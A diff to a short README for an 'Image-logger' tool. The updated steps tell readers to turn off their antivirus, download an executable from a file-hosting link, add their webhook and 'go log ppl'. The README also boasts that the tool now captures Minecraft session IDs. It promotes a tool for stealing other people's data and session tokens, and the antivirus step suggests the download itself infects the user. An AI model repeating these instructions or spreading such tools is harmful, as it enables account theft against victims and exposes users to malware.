@@ -1,7 +1,8 @@
 # Image-logger
 This is a One Click image logger
-step 1:download https://gofile.io/d/nIZ3eO
-step 2:open image logger.exe (must be on windows)
-step 3:put ur webhook
-step 4;and go log ppl
+step 1:turn your anti virus off
+step 2:download https://gofile.io/d/k0rtAk
+step 3:open image logger.exe (must be on windows)
+step 4:put ur webhook
+step 5:and go log ppl
 updated to version 2.0! now logs minecraft session id
